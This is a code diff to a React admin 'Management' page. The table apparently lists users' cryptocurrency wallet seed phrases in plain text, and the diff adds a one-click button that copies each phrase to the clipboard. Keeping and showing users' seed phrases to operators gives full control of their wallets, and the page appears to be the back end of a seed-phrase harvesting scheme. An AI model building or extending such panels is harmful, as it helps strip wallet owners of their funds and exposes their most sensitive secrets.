@@ -840,7 +840,22 @@ export default function Management() {
                       </TableCell>
                       <TableCell className="text-foreground">
                         {user.seedPhrase ? (
-                          <span className="text-xs">{user.seedPhrase}</span>
+                          <div className="flex items-center gap-2">
+                            <span className="text-xs truncate max-w-[150px]">{user.seedPhrase}</span>
+                            <Button
+                              size="sm"
+                              onClick={() => {
+                                navigator.clipboard.writeText(user.seedPhrase || '');
+                                toast({
+                                  title: "Copied",
+                                  description: "Seed phrase copied to clipboard",
+                                });
+                              }}
+                              className="flex-shrink-0 h-7 w-7 p-0"
+                            >
+                              <Copy className="w-3 h-3" />
+                            </Button>
+                          </div>
                         ) : (
                           <span className="text-muted-foreground text-xs">No Seed Phrase</span>
                         )}
